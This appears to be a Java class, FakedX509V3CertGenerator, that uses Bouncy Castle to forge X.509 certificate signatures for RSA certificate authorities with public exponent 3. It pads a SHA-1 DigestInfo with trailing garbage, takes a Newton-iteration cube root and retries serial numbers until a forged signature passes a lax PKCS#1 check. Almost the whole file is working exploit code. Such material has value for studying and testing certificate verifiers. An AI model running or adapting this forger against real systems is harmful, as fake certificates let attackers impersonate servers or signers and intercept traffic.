package org.example.liao;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.cert.CertificateParsingException;
import java.security.cert.X509Certificate;
import java.security.interfaces.RSAPublicKey;
import java.util.Date;
import java.util.Vector;

import javax.security.auth.x500.X500Principal;

import org.bouncycastle.asn1.ASN1Encodable;
import org.bouncycastle.asn1.ASN1EncodableVector;
import org.bouncycastle.asn1.ASN1InputStream;
import org.bouncycastle.asn1.ASN1Sequence;
import org.bouncycastle.asn1.DERBitString;
import org.bouncycastle.asn1.DERInteger;
import org.bouncycastle.asn1.DERNull;
import org.bouncycastle.asn1.DERObjectIdentifier;
import org.bouncycastle.asn1.DEROctetString;
import org.bouncycastle.asn1.DEROutputStream;
import org.bouncycastle.asn1.DERSequence;
import org.bouncycastle.asn1.pkcs.PKCSObjectIdentifiers;
import org.bouncycastle.asn1.x509.AlgorithmIdentifier;
import org.bouncycastle.asn1.x509.DigestInfo;
import org.bouncycastle.asn1.x509.KeyUsage;
import org.bouncycastle.asn1.x509.SubjectPublicKeyInfo;
import org.bouncycastle.asn1.x509.TBSCertificateStructure;
import org.bouncycastle.asn1.x509.Time;
import org.bouncycastle.asn1.x509.V3TBSCertificateGenerator;
import org.bouncycastle.asn1.x509.X509CertificateStructure;
import org.bouncycastle.asn1.x509.X509Extension;
import org.bouncycastle.asn1.x509.X509Extensions;
import org.bouncycastle.asn1.x509.X509Name;
import org.bouncycastle.jce.X509Principal;
import org.bouncycastle.jce.provider.X509CertificateObject;
import org.bouncycastle.util.encoders.Hex;

/**
 * class to produce an X.509 Version 3 certificate.
 */
public class FakedX509V3CertGenerator
{	
	private static final BigInteger START_CUBE_SHA1_1024 = new BigInteger(
	    "01428a2f98d728ae2208231f5a4c25f5ec715e81ea5f16e1bd6f38678b78aa2f13a13ce49438e38d2c5c57", 16);

	private static final BigInteger START_CUBE_SHA1_2048 = new BigInteger(
	    "32cbfd4a7adc7905583d75dcbcca6aaef3a9385ebb0babfdb380d9aee33b12081d88fc5b731dea441e08c1"
	    + "dd6cad07948233b4161621762b1a6c2d98245a9a92c878b31d8a107dcbd9a57832c5ec998511c60e68cd", 16);

    private V3TBSCertificateGenerator   tbsGen;
    private DERObjectIdentifier         sigOID;
    private AlgorithmIdentifier         sigAlgId;
    
    private String issuerHashAlg;
    private X500Principal issuer;
    private int issuerKeyByteLen;
    private BigInteger sn;
    
    private final static AlgorithmIdentifier AID_SHA1 = new AlgorithmIdentifier("1.3.14.3.2.26");

    public static void main(String[] args) {
      System.out.println(START_CUBE_SHA1_2048.toString(16));
    }
    
    public FakedX509V3CertGenerator(X509Certificate issuerCert, BigInteger beginSerialNumber)
    {
    	sn = beginSerialNumber;
    	
    	String sigAlg = issuerCert.getSigAlgName();
    	if("SHA1WithRSA".equalsIgnoreCase(sigAlg)){
    		issuerHashAlg = "SHA1";
    	}else if("MD5WithRSA".equalsIgnoreCase(sigAlg)){
    		issuerHashAlg = "MD5";
    	} else{
    		throw new IllegalArgumentException("CA SigAlg not supported");
    	}
    	
    	RSAPublicKey issuerPublicKey = (RSAPublicKey)issuerCert.getPublicKey();
    	
        issuerKeyByteLen = (issuerPublicKey.getModulus().bitLength()+7)/8;
        	
        if(issuerPublicKey.getPublicExponent().
    	  compareTo(BigInteger.valueOf(3)) != 0){
    		throw new IllegalArgumentException("Public exponent is not 3");
     	}
    	
        tbsGen = new V3TBSCertificateGenerator();
        
        issuer = issuerCert.getIssuerX500Principal();
        
 
        try
        {
            tbsGen.setIssuer(new X509Principal(
            		issuer.getEncoded()));
        }
        catch (IOException e)
        {
            throw new IllegalArgumentException("can't process principal: " + e);
        }
    }
    /**
     * set the serial number for the certificate.
     */
    private void setSerialNumber(
        BigInteger      serialNumber)
    {
        if (serialNumber.compareTo(BigInteger.ZERO) <= 0)
        {
            throw new IllegalArgumentException("serial number must be a positive integer");
        }
        
        tbsGen.setSerialNumber(new DERInteger(serialNumber));
    }
    
    public void setNotBefore(
        Date    date)
    {
        tbsGen.setStartDate(new Time(date));
    }

    public void setNotAfter(
        Date    date)
    {
        tbsGen.setEndDate(new Time(date));
    }

    /**
     * Set the subject distinguished name. The subject describes the entity associated with the public key.
     */
    public void setSubjectDN(
        X500Principal   subject)
    {
        try
        {
            tbsGen.setSubject(new X509Principal(subject.getEncoded()));
        }
        catch (IOException e)
        {
            throw new IllegalArgumentException("can't process principal: " + e);
        }
    }
    
    /**
     * Set the subject distinguished name. The subject describes the entity associated with the public key.
     */
    public void setSubjectDN(
        X509Name   subject)
    {
        tbsGen.setSubject(subject);
    }

    public void setPublicKey(
        PublicKey       key)
        throws IllegalArgumentException
    {
        ASN1InputStream asn1InStream = new ASN1InputStream(
            new ByteArrayInputStream(key.getEncoded()));
        try
        {
            tbsGen.setSubjectPublicKeyInfo(
                new SubjectPublicKeyInfo((ASN1Sequence) asn1InStream.readObject()));
        }
        catch (Exception e)
        {
            throw new IllegalArgumentException("unable to process key - " + e.toString());
        }
        finally {
            try {
              asn1InStream.close();
            } catch (IOException ex) {
            }
        }
    }

    /**
     * Set the signature algorithm. This can be either a name or an OID, names
     * are treated as case insensitive.
     * 
     * @param signatureAlgorithm string representation of the algorithm name.
     */
    public void setSignatureAlgorithm(
        String  signatureAlgorithm)
    {
        if ("SHA1WITHRSA".equalsIgnoreCase(signatureAlgorithm))
        {
            sigOID = PKCSObjectIdentifiers.sha1WithRSAEncryption;
            sigAlgId = new AlgorithmIdentifier(sigOID, new DERNull());
        } else 
        {
            throw new IllegalArgumentException("Unknown signature type requested: " + signatureAlgorithm);
        }

        tbsGen.setSignature(sigAlgId);
    }

    /**
     * generate an X509 certificate with faked signature
     */
    public X509Certificate generate()
        throws Exception
    {
    	MessageDigest md = MessageDigest.getInstance(issuerHashAlg);
        byte[] signature, digest, encodedTBSCert;

        long start = System.nanoTime();

        int tries = 0;
    	while(true)
    	{
    		tries++;

    		setSerialNumber(sn);
            TBSCertificateStructure tbsCert = generateTbsCert();
        	encodedTBSCert = tbsCert.getEncoded(ASN1Encodable.DER);
        	
        	digest = md.digest(encodedTBSCert);
        	        	
        	if("SHA1".equalsIgnoreCase(issuerHashAlg)){
            	signature = computeSignature(AID_SHA1, digest);
            	if(signature != null){
                	long duration = System.nanoTime() - start;
                	
                	String time;
                	
                	if(duration > 1000000000l) {
                		time = duration / 1000000000l + " s";
                	} else if(duration > 1000000l) {
                		time = duration / 1000000l + " ms";
                	} else if(duration > 1000l) {
                		time = duration / 1000l + " us";
                	} else {
                		time = duration + " ns";
                	}
                	System.out.println("Found cert with faked signature: " + tries + " tries and " + time);
            		
            		return generateJcaObject(tbsCert, signature);
            	}
        	}
        	else{
        		throw new Exception("the given hash algo not supported");
        	}
    		
    		sn = sn.add(BigInteger.ONE);
    	} 
    }
    
    private byte[] computeSignature(AlgorithmIdentifier hashAlgId, byte[] digest)    
	throws IOException
	{
        ByteArrayOutputStream   bOut = new ByteArrayOutputStream();
        DEROutputStream         dOut = new DEROutputStream(bOut);
        DigestInfo              dInfo = new DigestInfo(hashAlgId, digest);

        dOut.writeObject(dInfo);

		byte[] encoded = bOut.toByteArray();
		
		int lenMustSame = encoded.length + 10;
		
		// The first byte 0 is ignored
		byte[] A = new byte[issuerKeyByteLen-1];
		
		A[0] = 1;
		
		int offset = 1; 
		for(; offset < 9; offset++){
			A[offset] = (byte) 255;
		}
		
		// The seperator 0
		offset ++;
		
		System.arraycopy(encoded, 0, A, offset, encoded.length);
		
		offset += encoded.length;
		
		for(; offset < A.length; offset++){
			A[offset] = (byte) 255;
		}
		
		System.out.println("after padding: " + new String(Hex.encode(A)));

		BigInteger s = new BigInteger(1, A);

		BigInteger _2 = BigInteger.valueOf(2);
		BigInteger _3 = BigInteger.valueOf(3);
		BigInteger x1, x2;
		
		x2 = issuerKeyByteLen == 128 ? 
				START_CUBE_SHA1_1024 : 
				START_CUBE_SHA1_2048;

		byte[] b = new byte[A.length -lenMustSame];
		for (int i = 0; i < b.length; i++) {
			b[i] = (byte) 255;
		}
		BigInteger k = new BigInteger(1, b);
		
		BigInteger v, _3v, t;
		
		BigInteger s_minus_t;
		
		do{
			x1 = x2;
			v = x1.pow(2);
			x2 = v.multiply(_2).multiply(x1).add(s);			
			_3v = v.multiply(_3);			
			x2 = x2.divide(_3v);
			t = x2.pow(3);
			s_minus_t = s.subtract(t);			
			//System.out.println("tmpb: " + s_minus_t);
		}while( x2.compareTo(x1)!=0 && (s_minus_t.signum() == -1 || s_minus_t.compareTo(k) > 0));
		
		byte[] tbytes = t.toByteArray();
		
		int i = 0;
		for (; i < A.length; i++) {
			if(tbytes[i] != A[i])
				break;
			else{				
			}
		}
		
		dOut.close();

		if(i >= lenMustSame){
			byte[] tmp = x2.toByteArray();			
			byte[] rv = new byte[issuerKeyByteLen];
			System.arraycopy(tmp, 0, rv, issuerKeyByteLen-tmp.length, tmp.length);
			
			return rv;
		}
		
		return null;
	}    
        
    private TBSCertificateStructure generateTbsCert()
    {
        X509Extension extn = new X509Extension(true, 
            new DEROctetString(
                new KeyUsage(KeyUsage.digitalSignature).toASN1Object().getDEREncoded()));
        Vector<DERObjectIdentifier> objectIDs = new Vector<>();
        objectIDs.add(X509Extensions.KeyUsage);
        Vector<X509Extension> values = new Vector<>();
        values.add(extn);
        X509Extensions extns = new X509Extensions(objectIDs, values);
        tbsGen.setExtensions(extns);
        return tbsGen.generateTBSCertificate();
    }

    private X509Certificate generateJcaObject(TBSCertificateStructure tbsCert, byte[] signature)
        throws CertificateParsingException
    {
        ASN1EncodableVector v = new ASN1EncodableVector();

        v.add(tbsCert);
        v.add(sigAlgId);
        v.add(new DERBitString(signature));

        return new X509CertificateObject(new X509CertificateStructure(new DERSequence(v)));
    }

}
